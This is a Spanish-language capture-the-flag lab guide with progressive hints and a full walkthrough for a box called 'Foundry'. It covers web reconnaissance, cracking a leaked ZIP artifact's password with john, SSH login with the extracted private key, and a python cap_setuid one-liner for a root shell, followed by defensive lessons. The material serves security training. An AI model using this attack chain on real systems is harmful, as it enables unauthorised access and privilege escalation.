# 🧭 Guía por pistas — Foundry

Guía de resolución por **pistas progresivas**. Cada etapa tiene tres niveles:

- **Pista 1** — empujón conceptual (qué buscar, sin el cómo).
- **Pista 2** — la técnica o herramienta concreta.
- **Pista 3** — el comando exacto.

Abrí solo la que necesites. Al final está el **walkthrough completo**, colapsado,
para verificar tu solución cuando termines.

> Punto de partida: `http://127.0.0.1:8081` (HTTP) y `ssh -p 2223` (SSH).
> Reemplazá `127.0.0.1:8081` por la IP:puerto que estés usando.

---

## Etapa 0 · Reconocimiento

<details>
<summary><b>Pista 1</b> — ¿por dónde entro?</summary>

Dos servicios: un servidor web y SSH. El SSH no te sirve todavía porque no tenés clave ni
credenciales. Todo arranca por el **web**. Mapeá qué hay publicado: puertos, versión del
servidor y, sobre todo, **qué rutas y archivos existen** (incluyendo los que el sitio no
enlaza pero sí lista en lugares como `robots.txt`).

</details>

<details>
<summary><b>Pista 2</b> — herramientas</summary>

- Escaneo de puertos/servicios: `nmap`.
- Lo primero y más barato en web: mirar `robots.txt` y `sitemap.xml`.
- Descubrimiento de contenido: `gobuster`, `feroxbuster` o `ffuf` (fuzzeá extensiones de
  respaldo/artefacto como `.zip`, `.tar.gz`, `.bak`).

</details>

<details>
<summary><b>Pista 3</b> — comandos</summary>

```bash
nmap -sC -sV -p- 127.0.0.1 -oN nmap.txt      # (o la IP del contenedor)

curl -s http://127.0.0.1:8081/robots.txt     # ¿qué rutas "ocultan"?

gobuster dir -u http://127.0.0.1:8081 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x zip,tar,gz,bak -t 40
```

</details>

---

## Etapa 1 · El directorio de artefactos

<details>
<summary><b>Pista 1</b> — qué buscar</summary>

El `robots.txt` menciona una carpeta que "no querían indexar". Justamente esa carpeta tiene
el **listado de directorio activado**: podés ver su contenido entrando directo. El runner de
CI dejó ahí un **artefacto de build** publicado por error.

</details>

<details>
<summary><b>Pista 2</b> — la técnica</summary>

Entrá a la ruta que delató `robots.txt`. Vas a ver un *index* automático (autoindex) con un
archivo comprimido. Bajalo. No lo abras a ciegas: fijate primero si **pide contraseña**.

</details>

<details>
<summary><b>Pista 3</b> — comandos</summary>

```bash
curl -s http://127.0.0.1:8081/artifacts/            # listado automático
curl -s http://127.0.0.1:8081/artifacts/build-artifacts.zip -o build-artifacts.zip

unzip -l build-artifacts.zip      # lista el contenido (clave privada + nota)
unzip build-artifacts.zip         # -> te pide contraseña: toca crackearla
```

</details>

---

## Etapa 2 · Crackeo de la contraseña del ZIP

<details>
<summary><b>Pista 1</b> — qué tenés en la mano</summary>

Un `.zip` cifrado con contraseña. Esa contraseña es tu hash a romper **offline**: no la
adivines a mano, extraé el hash del archivo y pasale un diccionario.

</details>

<details>
<summary><b>Pista 2</b> — la técnica</summary>

`john` trae `zip2john`, que convierte un ZIP protegido en un hash crackeable. Después lo
atacás con `rockyou.txt`. (`fcrackzip -D -p rockyou.txt` es una alternativa.)

</details>

<details>
<summary><b>Pista 3</b> — comandos</summary>

```bash
zip2john build-artifacts.zip > zip.hash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
john --show zip.hash

# con la contraseña, extraé el contenido:
unzip -P LA_PASS build-artifacts.zip
cat NOTES.txt          # te dice el usuario del sistema
```

</details>

---

## Etapa 3 · Acceso inicial por SSH

<details>
<summary><b>Pista 1</b> — qué buscar</summary>

Dentro del ZIP hay una **clave privada SSH** (`id_rsa`) y una nota con el **usuario** del
host. A diferencia de otros labs, esta clave **no tiene passphrase**: entra directo (ojo con
los permisos del archivo).

</details>

<details>
<summary><b>Pista 2</b> — la técnica</summary>

`chmod 600` a la clave o SSH la rechaza. El usuario lo tenés en `NOTES.txt`. Conectá al
puerto SSH del lab con `-i id_rsa`.

</details>

<details>
<summary><b>Pista 3</b> — comandos</summary>

```bash
chmod 600 id_rsa
ssh -i id_rsa -p 2223 builder@127.0.0.1
cat ~/user.txt
```

</details>

---

## Etapa 4 · Escalada de privilegios por *capabilities*

<details>
<summary><b>Pista 1</b> — qué buscar</summary>

Ya sos un usuario normal. Antes de mirar `sudo`, revisá un vector más silencioso: las
**Linux capabilities**. Son permisos finos que se pueden poner sobre un binario concreto; si
a un intérprete (Python, Perl, etc.) le dejaron la capability equivocada, equivale a regalar
root.

</details>

<details>
<summary><b>Pista 2</b> — la técnica</summary>

Enumerá capabilities en todo el sistema con `getcap -r /`. Ojo: `getcap` vive en
`/usr/sbin`, que puede **no estar en tu `PATH`** por SSH — llamalo por ruta completa. Buscá
una capability como `cap_setuid`. Con ella, el binario puede cambiar su UID a 0: consultá
**GTFOBins → Capabilities** para la sintaxis exacta del binario que encuentres.

</details>

<details>
<summary><b>Pista 3</b> — comandos</summary>

```bash
/usr/sbin/getcap -r / 2>/dev/null
# -> /usr/bin/python3.11 cap_setuid=ep

# GTFOBin (capabilities) de python: setuid(0) y shell de root
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

id            # uid=0(root)
cat /root/root.txt
```

</details>

---

<details>
<summary><h2>🏁 Walkthrough completo (SPOILER — abrí solo para verificar)</h2></summary>

### Reconocimiento
```bash
nmap -sC -sV -p- 127.0.0.1
# 80/tcp  nginx
# 22/tcp  OpenSSH
curl -s http://127.0.0.1:8081/robots.txt
# Disallow: /artifacts/
```

### Etapa 1 — artefacto publicado con autoindex
```bash
curl -s http://127.0.0.1:8081/artifacts/
# build-artifacts.zip
curl -s http://127.0.0.1:8081/artifacts/build-artifacts.zip -o build-artifacts.zip
unzip -l build-artifacts.zip
# id_rsa, NOTES.txt   (cifrados con contraseña)
```

### Etapa 2 — crackeo del ZIP
```bash
zip2john build-artifacts.zip > zip.hash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
# build-artifacts.zip : princess
unzip -P princess build-artifacts.zip
cat NOTES.txt
#  -> usuario del host: builder
```

### Etapa 3 — acceso inicial
```bash
chmod 600 id_rsa
ssh -i id_rsa -p 2223 builder@127.0.0.1
cat ~/user.txt
```

### Etapa 4 — escalada por capability cap_setuid
```bash
/usr/sbin/getcap -r / 2>/dev/null
# /usr/bin/python3.11 cap_setuid=ep
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
id            # uid=0(root)
cat /root/root.txt
```

### Resumen de credenciales
| Elemento | Valor |
|:---------|:------|
| Contraseña del ZIP | `princess` |
| Clave SSH | `id_rsa` (sin passphrase) |
| Usuario SSH | `builder` |
| Escalada | `cap_setuid` en `/usr/bin/python3.11` → root |

### Lecciones (lado defensivo)
- Nunca publicar artefactos de build hacia afuera; y desactivar el *autoindex* (`autoindex off`).
- Un ZIP "protegido" con contraseña de diccionario no protege nada: se crackea offline en segundos.
- Jamás meter claves privadas dentro de backups/artefactos; y protegerlas con passphrase fuerte.
- Las *capabilities* son potentes pero peligrosas: `cap_setuid`, `cap_setgid`, `cap_dac_override`
  o `cap_sys_admin` sobre intérpretes (python, perl) equivalen a dar root. Auditá con
  `getcap -r /` y quitá lo que no haga falta.

</details>
